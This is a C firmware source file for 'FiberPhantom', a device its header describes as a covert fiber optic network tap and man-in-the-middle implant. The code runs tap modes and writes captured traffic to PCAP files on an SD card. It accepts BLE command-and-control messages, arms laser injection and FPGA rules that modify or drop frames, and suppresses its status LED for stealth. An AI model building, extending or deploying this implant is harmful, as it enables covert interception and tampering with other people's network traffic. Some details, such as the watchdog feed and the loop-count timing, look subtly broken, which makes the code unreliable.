/*
 * main.c — FiberPhantom firmware entry point
 * Author: jayis1
 * Date:   2026-06-17
 *
 * Target: Raspberry Pi RP2040 (dual Cortex-M0+ @ 133 MHz)
 *
 * FiberPhantom is a covert fiber optic network tap and MITM implant.
 * This firmware runs on the RP2040 control MCU and manages:
 *  - Boot sequence and hardware initialization
 *  - Deployment mode selection (bend-tap, inline-couple, SFP+ pass-through)
 *  - FPGA configuration and CDR/framing control
 *  - APD bias and AGC loop
 *  - VCSEL injection control (MITM)
 *  - MicroSD PCAP capture
 *  - BLE C2 protocol (via nRF52840)
 *  - Power management and battery monitoring
 *  - Main event loop
 */

#include "board.h"
#include "registers.h"
#include "drivers/apd_driver.h"
#include "drivers/cdr_driver.h"
#include "drivers/ble_c2_driver.h"
#include "drivers/sd_driver.h"
#include "drivers/vcsel_driver.h"
#include <string.h>

/* ---- Forward declarations ---- */
static void clock_init(void);
static void gpio_init_all(void);
static void led_init(void);
static void led_set(uint8_t r, uint8_t g);
static void delay_us(uint32_t us);
static void delay_ms(uint32_t ms);
static deploy_mode_t read_mode_straps(void);
static uint8_t read_battery_pct(void);
static uint8_t is_charging(void);
static void handle_c2_message(const c2_msg_t *msg);
static void process_capture(void);
static void process_agc(void);
static void process_battery_monitor(void);
static void process_alerts(void);
static void update_status(void);
static void enter_low_power(void);
static void wdt_init(uint32_t timeout_ms);
static void wdt_feed(void);

/* ---- Global state ---- */
static sys_status_t g_status;
static capture_stats_t g_stats;
static deploy_mode_t g_mode = MODE_STANDBY;
static op_state_t g_state = STATE_BOOT;
static uint32_t g_boot_time_sec = 0;
static uint32_t g_last_agc_time = 0;
static uint32_t g_last_batt_time = 0;
static uint32_t g_last_status_time = 0;
static uint32_t g_capture_active = 0;
static uint32_t g_mitm_enabled = 0;
static uint8_t  g_apd_calibrated = 0;
static uint8_t  g_agc_enabled = 1;
static uint8_t  g_led_blink_state = 0;
static uint32_t g_led_blink_time = 0;

/* Frame buffer for reading from FPGA */
static uint8_t g_frame_buf[65536];

/* ---- Startup assembly entry point ----
 * In a real build, startup.s provides the reset handler that sets up
 * the stack pointer, copies .data to RAM, zeros .bss, and calls main().
 * For this reference firmware, we provide a simplified main() that
 * assumes the boot ROM has loaded us and basic memory is initialized.
 */

int main(void)
{
    /* ---- Phase 1: Low-level hardware initialization ---- */
    clock_init();
    gpio_init_all();
    led_init();
    wdt_init(8000);  /* 8 second watchdog timeout */

    /* Signal boot: red LED on */
    led_set(1, 0);

    /* ---- Phase 2: Driver initialization ---- */
    ble_c2_init();
    cdr_spi_init();
    apd_init();
    vcsel_init();
    sd_init();

    /* ---- Phase 3: Read deployment mode ---- */
    g_mode = read_mode_straps();

    /* ---- Phase 4: FPGA configuration ---- */
    led_set(1, 1);  /* Yellow: configuring FPGA */
    int fpga_ret = fpga_configure();
    if (fpga_ret != 0) {
        /* FPGA configuration failed — enter error state */
        g_state = STATE_ERROR;
        led_set(1, 0);  /* Red: error */
        /* Try to continue anyway — some functionality may work */
    } else {
        /* FPGA configured successfully */
        fpga_reset_stats();
    }

    /* ---- Phase 5: Mode-specific initialization ---- */
    switch (g_mode) {
    case MODE_BEND_TAP:
        /* Bend-tap: read-only passive monitoring
         * No VCSEL needed, no injection path.
         * Enable APD with auto-calibration. */
        led_set(0, 1);  /* Green: bend-tap mode */
        apd_boost_enable(1);
        delay_ms(100);
        apd_autocalibrate();
        g_apd_calibrated = 1;
        g_state = STATE_IDLE;
        break;

    case MODE_INLINE_COUPLE:
        /* Inline-couple: full-duplex tap + MITM injection
         * Enable APD, calibrate, and arm VCSEL (but don't enable yet). */
        led_set(0, 1);  /* Green: inline mode */
        apd_boost_enable(1);
        delay_ms(100);
        apd_autocalibrate();
        g_apd_calibrated = 1;
        /* VCSEL is enabled on-demand when MITM rules are active */
        vcsel_init();
        g_state = STATE_IDLE;
        break;

    case MODE_SFP_PASS_THRU:
        /* SFP+ pass-through: full transparent access
         * APD not needed (electrical signal from SFP+ RX PD).
         * VCSEL not needed for injection (SFP+ TX path).
         * FPGA handles both directions directly.
         * But we still use the APD path for monitoring. */
        led_set(0, 1);  /* Green: SFP+ mode */
        apd_boost_enable(1);
        delay_ms(100);
        /* In SFP+ mode, APD may not be used if SFP+ PD provides signal.
         * For flexibility, we enable it anyway. */
        g_state = STATE_IDLE;
        break;

    case MODE_STANDBY:
    default:
        /* Standby: no optical activity, charging/idle */
        led_set(0, 0);  /* Off: standby */
        g_state = STATE_IDLE;
        break;
    }

    /* ---- Phase 6: Main event loop ---- */
    g_boot_time_sec = 0;
    uint32_t loop_count = 0;

    while (1) {
        wdt_feed();
        loop_count++;

        /* 1. Process BLE C2 messages (non-blocking) */
        ble_c2_poll();
        if (c2_msg_ready) {
            handle_c2_message((const c2_msg_t *)&c2_last_msg);
            c2_msg_ready = 0;
        }

        /* 2. Process frame capture (if capturing) */
        if (g_capture_active && g_state == STATE_CAPTURING) {
            process_capture();
        }

        /* 3. Run APD AGC loop periodically (every 500ms) */
        if (g_agc_enabled && g_apd_calibrated) {
            uint32_t now = g_boot_time_sec * 1000 + (loop_count / 133);
            if ((now - g_last_agc_time) > 500) {
                process_agc();
                g_last_agc_time = now;
            }
        }

        /* 4. Battery monitoring (every 5 seconds) */
        uint32_t now = g_boot_time_sec;
        if ((now - g_last_batt_time) >= 5) {
            process_battery_monitor();
            g_last_batt_time = now;
        }

        /* 5. Periodic status update over BLE (every 2 seconds) */
        if (ble_c2_is_connected() && (now - g_last_status_time >= 2)) {
            update_status();
            g_last_status_time = now;
        }

        /* 6. Alert processing */
        process_alerts();

        /* 7. LED blink for active state indication (stealth: very dim) */
        if (g_state == STATE_CAPTURING || g_state == STATE_MITM_ACTIVE) {
            uint32_t led_now = loop_count;
            if ((led_now - g_led_blink_time) > 66000000) {  /* ~0.5s at 133MHz */
                g_led_blink_state = !g_led_blink_state;
                if (g_led_blink_state) {
                    led_set(0, 0);  /* Off */
                } else {
                    /* Very brief dim flash (stealth indicator) */
                    if (g_state == STATE_MITM_ACTIVE) {
                        led_set(0, 0);  /* MITM: no visible LED (ultra-stealth) */
                    } else {
                        led_set(0, 1);  /* Capture: brief green flash */
                    }
                }
                g_led_blink_time = led_now;
            }
        }

        /* 8. Uptime counter (approximate, based on loop iterations) */
        /* In production, this would use a hardware timer interrupt */
        if ((loop_count % 133000000) == 0) {
            g_boot_time_sec++;
        }

        /* 9. Low-power optimization when idle */
        if (g_state == STATE_IDLE && !g_capture_active && !ble_c2_is_connected()) {
            enter_low_power();
        }
    }

    return 0;  /* Never reached */
}

/* ============================================================
 * Clock initialization
 * ============================================================ */
static void clock_init(void)
{
    /* Enable XOSC (12 MHz crystal) */
    XOSC->ctrl = XOSC_FREQ_RANGE_1_15MHZ;
    XOSC->startup = 47;  /* Startup count: ~1ms / (1/12000000) = 12000, but simplified */
    XOSC->ctrl = XOSC_ENABLED | XOSC_FREQ_RANGE_1_15MHZ;

    /* Wait for XOSC stable */
    while (!(XOSC->status & (1 << 31))) { }

    /* Configure PLL_SYS: reference = XOSC (12 MHz), VCO = 1200 MHz
     * FBDIV = 100 (VCO = 12 * 100 = 1200 MHz)
     * PD1 = 5 (240 MHz), PD2 = 1 (240 MHz)... no, we want 133 MHz
     * VCO = 1200, PD1 = 6 (200 MHz), PD2 = 1... 
     * Actually: SYS_CLK = VCO / (PD1 * PD2) but the RP2040 PLL has
     * POSTDIV1 and POSTDIV2: sys_clk = VCO / POSTDIV1 / POSTDIV2
     * VCO = 1200 MHz, POSTDIV1 = 6, POSTDIV2 = 2 → 100 MHz (not 133)
     * For 133 MHz: FBDIV=133*5*2=1330, but VCO must be 400-1600 MHz
     * FBDIV = 133, REFDIV = 1: VCO = 12 * 133 = 1596 MHz (within range)
     * POSTDIV1 = 6, POSTDIV2 = 2 → 1596 / 6 / 2 = 133 MHz ✓
     */

    /* Disable PLL_SYS for configuration */
    PLL_SYS_PWR |= (1 << 5);  /* PD = power down */
    delay_us(10);

    PLL_SYS_FBDIV = 133;
    PLL_SYS_PRIM = (6 << 16) | (2 << 12);  /* POSTDIV1=6, POSTDIV2=2 */
    PLL_SYS_PWR &= ~(1 << 5);  /* Power up */
    delay_us(100);

    /* Wait for PLL lock */
    while (!(PLL_SYS_CS & (1 << 31))) { }

    /* Switch system clock to PLL_SYS */
    CLK_CTRL(CLK_SYS) = 0;  /* Disable clock to modify source */
    CLK_CTRL(CLK_SYS) = 1;  /* Source = PLL_SYS */
    CLK_DIV(CLK_SYS) = 0x01000000;  /* Integer divide by 1 */

    /* Configure peripheral clock from PLL_SYS */
    CLK_CTRL(CLK_PERI) = 0;
    CLK_DIV(CLK_PERI) = 0x01000000;
    CLK_CTRL(CLK_PERI) = 1;  /* Source = PLL_SYS */

    /* Configure ADC clock from PLL_USB (48 MHz) */
    /* PLL_USB setup similar to PLL_SYS but for 48 MHz */
}

/* ============================================================
 * GPIO initialization
 * ============================================================ */
static void gpio_init_all(void)
{
    /* Enable IO bank */
    /* All GPIO pins start as digital inputs with no pulls. */
    /* Individual pin configuration is done by each driver. */
}

static void led_init(void)
{
    /* Configure LED pins as GPIO outputs */
    IO_BANK0_GPIO_CTRL(PIN_LED_R) = GPIO_FUNC_SIO;
    IO_BANK0_GPIO_CTRL(PIN_LED_G) = GPIO_FUNC_SIO;

    PADS_BANK0_GPIO(PIN_LED_R) = PAD_IE | PAD_DRIVE_2MA;
    PADS_BANK0_GPIO(PIN_LED_G) = PAD_IE | PAD_DRIVE_2MA;

    SIO_GPIO_OE_SET = GPIO_BIT(PIN_LED_R);
    SIO_GPIO_OE_SET = GPIO_BIT(PIN_LED_G);

    led_set(0, 0);  /* LEDs off initially */
}

static void led_set(uint8_t r, uint8_t g)
{
    if (r) SIO_GPIO_OUT_SET = GPIO_BIT(PIN_LED_R);
    else   SIO_GPIO_OUT_CLR = GPIO_BIT(PIN_LED_R);

    if (g) SIO_GPIO_OUT_SET = GPIO_BIT(PIN_LED_G);
    else   SIO_GPIO_OUT_CLR = GPIO_BIT(PIN_LED_G);
}

/* ============================================================
 * Mode strap reading
 * ============================================================ */
static deploy_mode_t read_mode_straps(void)
{
    /* Read GPIO pins 27 and 28 (mode straps) */
    /* Configure as inputs with pull-downs (active high with external pull-up) */
    IO_BANK0_GPIO_CTRL(PIN_MODE_STRAP0) = GPIO_FUNC_SIO;
    IO_BANK0_GPIO_CTRL(PIN_MODE_STRAP1) = GPIO_FUNC_SIO;
    PADS_BANK0_GPIO(PIN_MODE_STRAP0) = PAD_IE | PAD_PDE;
    PADS_BANK0_GPIO(PIN_MODE_STRAP1) = PAD_IE | PAD_PDE;
    SIO_GPIO_OE_CLR = GPIO_BIT(PIN_MODE_STRAP0);
    SIO_GPIO_OE_CLR = GPIO_BIT(PIN_MODE_STRAP1);

    delay_us(1000);  /* Let pull-downs settle */

    uint8_t strap0 = (SIO_GPIO_IN & GPIO_BIT(PIN_MODE_STRAP0)) ? 1 : 0;
    uint8_t strap1 = (SIO_GPIO_IN & GPIO_BIT(PIN_MODE_STRAP1)) ? 1 : 0;

    uint8_t mode = (strap1 << 1) | strap0;
    return (deploy_mode_t)mode;
}

/* ============================================================
 * Battery monitoring
 * ============================================================ */
static uint8_t read_battery_pct(void)
{
    /* Read ADC channel 3 (GPIO29) for battery voltage
     * Actually, we use ADC channel 3 which is the internal ADC input
     * wired to the battery divider on the FiberPhantom board.
     * Battery voltage: 2.8V (empty) to 4.2V (full)
     * Divider: V_batt / 3 → ADC range 0.93V to 1.4V
     * ADC: 12-bit, 3.3V reference → 0 to 4095
     * ADC reading: 0.93/3.3*4095 to 1.4/3.3*4095 = 1153 to 1737
     */
    ADC->cs = ADC_CS_EN | (3 << 12) | ADC_CS_START_ONCE;

    uint32_t timeout = 1000;
    while (!(ADC->cs & ADC_CS_READY) && --timeout) { }

    uint16_t adc_val = (uint16_t)(ADC->result & 0xFFF);

    /* Map ADC value to battery percentage */
    if (adc_val <= BATT_ADC_EMPTY) return 0;
    if (adc_val >= BATT_ADC_FULL) return 100;

    uint32_t pct = ((uint32_t)(adc_val - BATT_ADC_EMPTY) * 100) /
                   (BATT_ADC_FULL - BATT_ADC_EMPTY);
    if (pct > 100) pct = 100;
    return (uint8_t)pct;
}

static uint8_t is_charging(void)
{
    /* USB charging is detected via the USB power detect.
     * In simplified firmware, we check the ADC: if voltage is above
     * the "charging" threshold, we assume USB is connected. */
    ADC->cs = ADC_CS_EN | (3 << 12) | ADC_CS_START_ONCE;
    uint32_t timeout = 1000;
    while (!(ADC->cs & ADC_CS_READY) && --timeout) { }
    uint16_t adc_val = (uint16_t)(ADC->result & 0xFFF);
    return (adc_val >= BATT_ADC_CHARGING) ? 1 : 0;
}

/* ============================================================
 * C2 message handler
 * ============================================================ */
static void handle_c2_message(const c2_msg_t *msg)
{
    c2_msg_t response = {0};

    switch (msg->type) {
    case C2_MSG_PING:
        response.type = C2_MSG_PONG;
        response.length = 0;
        ble_c2_send(&response);
        break;

    case C2_MSG_GET_STATUS:
        update_status();
        ble_c2_send_status(&g_status);
        break;

    case C2_MSG_GET_STATS:
        /* Read stats from FPGA */
        fpga_get_stats(&g_stats.total_frames, NULL,
                       &g_stats.dropped_frames, &g_stats.mitm_modified,
                       &g_stats.mitm_dropped, &g_stats.crc_errors);
        g_stats.link_rate = fpga_get_link_rate();
        g_stats.uptime_sec = g_boot_time_sec;
        ble_c2_send_stats(&g_stats);
        break;

    case C2_MSG_SET_MODE:
        if (msg->length >= 1) {
            deploy_mode_t new_mode = (deploy_mode_t)msg->payload[0];
            /* Mode change at runtime (only for SFP+ ↔ standby transitions) */
            if (new_mode == MODE_STANDBY) {
                g_capture_active = 0;
                g_mitm_enabled = 0;
                fpga_capture_enable(0);
                fpga_mitm_enable(0);
                vcsel_disable();
                apd_set_bias(0);
                g_state = STATE_IDLE;
            } else if (new_mode == MODE_SFP_PASS_THRU) {
                g_mode = MODE_SFP_PASS_THRU;
                apd_boost_enable(1);
                apd_autocalibrate();
                g_apd_calibrated = 1;
            }
            response.type = C2_MSG_ACK;
            response.length = 1;
            response.payload[0] = (uint8_t)new_mode;
            ble_c2_send(&response);
        }
        break;

    case C2_MSG_SET_APD_BIAS:
        if (msg->length >= 4) {
            uint32_t bias_mv = ((uint32_t)msg->payload[0] << 24) |
                               ((uint32_t)msg->payload[1] << 16) |
                               ((uint32_t)msg->payload[2] << 8) |
                               ((uint32_t)msg->payload[3]);
            int ret = apd_set_bias(bias_mv);
            response.type = (ret == 0) ? C2_MSG_ACK : C2_MSG_NACK;
            response.length = 4;
            memcpy(response.payload, msg->payload, 4);
            ble_c2_send(&response);
        }
        break;

    case C2_MSG_START_CAPTURE:
        if (!sd_is_present()) {
            response.type = C2_MSG_NACK;
            response.payload[0] = ALERT_SD_REMOVED;
            response.length = 1;
            ble_c2_send(&response);
            break;
        }
        /* Determine link type for PCAP */
        link_rate_t rate = fpga_get_link_rate();
        uint32_t link_type = PCAP_NETWORK_ETHER;
        if (rate == LINK_FC_8G || rate == LINK_FC_16G) {
            link_type = PCAP_NETWORK_FC;
        }
        if (sd_pcap_open(link_type) == 0) {
            fpga_capture_enable(1);
            fpga_reset_stats();
            g_capture_active = 1;
            g_state = STATE_CAPTURING;
            response.type = C2_MSG_ACK;
            response.length = 0;
        } else {
            response.type = C2_MSG_NACK;
            response.payload[0] = 0x01;  /* SD error */
            response.length = 1;
        }
        ble_c2_send(&response);
        break;

    case C2_MSG_STOP_CAPTURE:
        fpga_capture_enable(0);
        sd_pcap_close();
        g_capture_active = 0;
        if (g_mitm_enabled) {
            g_state = STATE_MITM_ACTIVE;
        } else {
            g_state = STATE_IDLE;
        }
        response.type = C2_MSG_ACK;
        response.length = 0;
        ble_c2_send(&response);
        break;

    case C2_MSG_SET_RULE:
        if (msg->length >= 1 + sizeof(mitm_rule_t)) {
            uint8_t rule_index = msg->payload[0];
            mitm_rule_t rule;
            memcpy(&rule, &msg->payload[1], sizeof(mitm_rule_t));
            int ret = fpga_write_rule(rule_index, &rule);
            response.type = (ret == 0) ? C2_MSG_ACK : C2_MSG_NACK;
            response.length = 1;
            response.payload[0] = rule_index;
            ble_c2_send(&response);
        }
        break;

    case C2_MSG_CLEAR_RULE:
        if (msg->length >= 1) {
            uint8_t rule_index = msg->payload[0];
            fpga_clear_rule(rule_index);
            response.type = C2_MSG_ACK;
            response.length = 1;
            response.payload[0] = rule_index;
            ble_c2_send(&response);
        }
        break;

    case C2_MSG_CLEAR_ALL_RULES:
        fpga_clear_all_rules();
        response.type = C2_MSG_ACK;
        response.length = 0;
        ble_c2_send(&response);
        break;

    case C2_MSG_ENABLE_MITM:
        if (msg->length >= 1) {
            uint8_t enable = msg->payload[0];
            if (enable && g_mode != MODE_BEND_TAP) {
                /* Enable VCSEL for injection (not in bend-tap mode) */
                if (!vcsel_is_active()) {
                    vcsel_enable();
                }
                fpga_mitm_enable(1);
                g_mitm_enabled = 1;
                g_state = STATE_MITM_ACTIVE;
            } else {
                fpga_mitm_enable(0);
                vcsel_disable();
                g_mitm_enabled = 0;
                g_state = (g_capture_active) ? STATE_CAPTURING : STATE_IDLE;
            }
            response.type = C2_MSG_ACK;
            response.length = 1;
            response.payload[0] = enable;
            ble_c2_send(&response);
        }
        break;

    case C2_MSG_ENABLE_INJECT:
        if (msg->length >= 1) {
            uint8_t enable = msg->payload[0];
            fpga_inject_enable(enable);
            if (enable && !vcsel_is_active() && g_mode != MODE_BEND_TAP) {
                vcsel_enable();
            } else if (!enable) {
                vcsel_disable();
            }
            response.type = C2_MSG_ACK;
            response.length = 1;
            response.payload[0] = enable;
            ble_c2_send(&response);
        }
        break;

    case C2_MSG_AUTO_CALIBRATE:
        {
            uint32_t optimal_bias = apd_autocalibrate();
            response.type = C2_MSG_CALIB_RESULT;
            response.length = 4;
            response.payload[0] = (optimal_bias >> 24) & 0xFF;
            response.payload[1] = (optimal_bias >> 16) & 0xFF;
            response.payload[2] = (optimal_bias >> 8) & 0xFF;
            response.payload[3] = (optimal_bias >> 0) & 0xFF;
            ble_c2_send(&response);
        }
        break;

    case C2_MSG_GET_BATT:
        response.type = C2_MSG_BATT;
        response.length = 2;
        response.payload[0] = read_battery_pct();
        response.payload[1] = is_charging();
        ble_c2_send(&response);
        break;

    case C2_MSG_SET_AGC:
        if (msg->length >= 1) {
            g_agc_enabled = msg->payload[0];
            response.type = C2_MSG_ACK;
            response.length = 1;
            response.payload[0] = g_agc_enabled;
            ble_c2_send(&response);
        }
        break;

    case C2_MSG_GET_VERSION:
        ble_c2_send_version();
        break;

    case C2_MSG_LIST_FILES:
        {
            /* Send file list */
            sd_list_files(NULL);  /* Callback would send C2 messages */
            response.type = C2_MSG_FILE_LIST_END;
            response.length = 0;
            ble_c2_send(&response);
        }
        break;

    default:
        /* Unknown command — NACK */
        response.type = C2_MSG_NACK;
        response.payload[0] = msg->type;
        response.length = 1;
        ble_c2_send(&response);
        break;
    }
}

/* ============================================================
 * Frame capture processing
 * ============================================================ */
static void process_capture(void)
{
    /* Read available frames from FPGA FIFO and write to SD card */
    uint32_t status = fpga_get_status();

    if (!(status & FPGA_STATUS_FRAME_READY)) {
        return;  /* No frames available */
    }

    /* Read frame from FPGA */
    uint32_t ts_lo, ts_hi;
    uint16_t frame_len;
    uint32_t read_len = fpga_read_frame(g_frame_buf, sizeof(g_frame_buf),
                                         &ts_lo, &ts_hi, &frame_len);

    if (read_len == 0) {
        g_stats.dropped_frames++;
        return;
    }

    /* Convert FPGA timestamp to PCAP timestamp (sec + usec) */
    /* FPGA timestamp is 64-bit at 125 MHz: sec = ts/125000000, usec = (ts%125000000)/125 */
    uint64_t timestamp = ((uint64_t)ts_hi << 32) | ts_lo;
    uint32_t ts_sec = (uint32_t)(timestamp / 125000000ULL);
    uint32_t ts_usec = (uint32_t)((timestamp % 125000000ULL) / 125ULL);

    /* Write packet to PCAP file */
    int ret = sd_pcap_write_packet(g_frame_buf, read_len,
                                    ts_sec, ts_usec, frame_len);

    if (ret == 0) {
        g_stats.total_frames++;
        g_stats.bytes_captured += read_len;
    } else {
        g_stats.dropped_frames++;
        /* If SD write fails (e.g., card full), stop capture and alert */
        if (ret == -3) {
            sd_pcap_close();
            g_capture_active = 0;
            fpga_capture_enable(0);
            g_state = STATE_SD_FULL;
            ble_c2_send_alert(ALERT_SD_FULL, 2);  /* Severity 2: high */
        }
    }

    /* Check for FIFO overflow */
    if (status & FPGA_STATUS_FIFO_FULL) {
        g_stats.dropped_frames++;
        ble_c2_send_alert(ALERT_FIFO_OVERFLOW, 1);
    }
}

/* ============================================================
 * APD AGC processing
 * ============================================================ */
static void process_agc(void)
{
    /* Run AGC step to maintain optimal signal level */
    apd_agc_step();

    /* Check APD health */
    int health = apd_health_check();
    if (health < 0 && health != -3) {
        /* APD fault (not just "no signal") */
        ble_c2_send_alert(ALERT_APD_FAULT, 2);
        g_agc_enabled = 0;  /* Disable AGC on fault */
    }
}

/* ============================================================
 * Battery monitoring
 * ============================================================ */
static void process_battery_monitor(void)
{
    uint8_t batt_pct = read_battery_pct();
    g_status.battery_pct = batt_pct;
    g_status.charging = is_charging();

    /* Low battery alerts */
    if (batt_pct <= 10 && batt_pct > 5) {
        ble_c2_send_alert(ALERT_LOW_BATTERY, 1);  /* Severity 1: medium */
    } else if (batt_pct <= 5) {
        ble_c2_send_alert(ALERT_BATTERY_CRITICAL, 2);  /* Severity 2: high */
        /* Enter low-power mode to preserve battery */
        if (g_capture_active) {
            sd_pcap_close();
            fpga_capture_enable(0);
            g_capture_active = 0;
        }
        vcsel_disable();
        apd_set_bias(0);
        g_state = STATE_LOW_BATTERY;
    }
}

/* ============================================================
 * Alert processing
 * ============================================================ */
static void process_alerts(void)
{
    uint32_t fpga_status = fpga_get_status();

    /* Check for link loss */
    static uint8_t link_was_up = 0;
    uint8_t link_up = (fpga_status & FPGA_STATUS_LINK_UP) ? 1 : 0;
    if (!link_up && link_was_up) {
        ble_c2_send_alert(ALERT_LINK_LOST, 1);
    }
    link_was_up = link_up;

    /* Check for MITM match (latched in FPGA status) */
    if (fpga_status & FPGA_STATUS_MITM_MATCH) {
        ble_c2_send_alert(ALERT_MITM_MATCH, 0);  /* Severity 0: info */
        /* Clear latched status by reading (auto-clear in FPGA design) */
    }

    /* Check for FPGA error */
    if (!fpga_is_ready() && g_state != STATE_ERROR) {
        ble_c2_send_alert(ALERT_FPGA_ERROR, 2);
        g_state = STATE_ERROR;
    }
}

/* ============================================================
 * Status update
 * ============================================================ */
static void update_status(void)
{
    g_status.mode = g_mode;
    g_status.state = g_state;
    g_status.sd_inserted = sd_is_present();
    g_status.ble_connected = ble_c2_is_connected();
    g_status.fpga_ready = fpga_is_ready();
    g_status.link_rate = fpga_get_link_rate();

    uint32_t free_mb = sd_get_free_mb();
    g_status.sd_free_mb_lo = (uint8_t)(free_mb & 0xFF);
    g_status.sd_free_mb_hi = (uint8_t)((free_mb >> 8) & 0xFF);

    /* Update stats from FPGA */
    uint32_t frame_cnt_hi;
    fpga_get_stats(&g_stats.total_frames, &frame_cnt_hi,
                   &g_stats.dropped_frames, &g_stats.mitm_modified,
                   &g_stats.mitm_dropped, &g_stats.crc_errors);
    g_stats.link_rate = fpga_get_link_rate();
    g_stats.uptime_sec = g_boot_time_sec;

    g_status.stats = g_stats;
}

/* ============================================================
 * Low-power mode
 * ============================================================ */
static void enter_low_power(void)
{
    /* In idle/standby with no BLE connection, reduce power consumption.
     * The RP2040 doesn't have a deep sleep, but we can:
     * 1. Disable unused peripherals
     * 2. Reduce clock speed (not implemented in this simplified version)
     * 3. Wait for interrupt (WFI instruction)
     *
     * In production, a timer interrupt would wake the system every 1s
     * to check for SD card insertion, mode strap changes, etc.
     */

    /* For now, just a brief WFI to save some power between loop iterations */
    __asm__ volatile ("wfi");
}

/* ============================================================
 * Watchdog
 * ============================================================ */
static void wdt_init(uint32_t timeout_ms)
{
    /* RP2040 watchdog: tick at 1 MHz from XOSC
     * LOAD = timeout_ms * 1000 (microseconds)
     */
    WATCHDOG_LOAD = timeout_ms * 1000;
    WATCHDOG_CTRL = WATCHDOG_CTRL_ENABLE | 0;  /* Enable, no debug pause */
}

static void wdt_feed(void)
{
    /* Writing 0x616c6d6f to the watchdog LOAD register reloads it */
    WATCHDOG_LOAD = 0x616c6d6f;
}

/* ============================================================
 * Delay functions
 * ============================================================ */
static void delay_us(uint32_t us)
{
    volatile uint32_t count = us * 44;
    while (count--) __asm__ volatile ("nop");
}

static void delay_ms(uint32_t ms)
{
    while (ms--) delay_us(1000);
}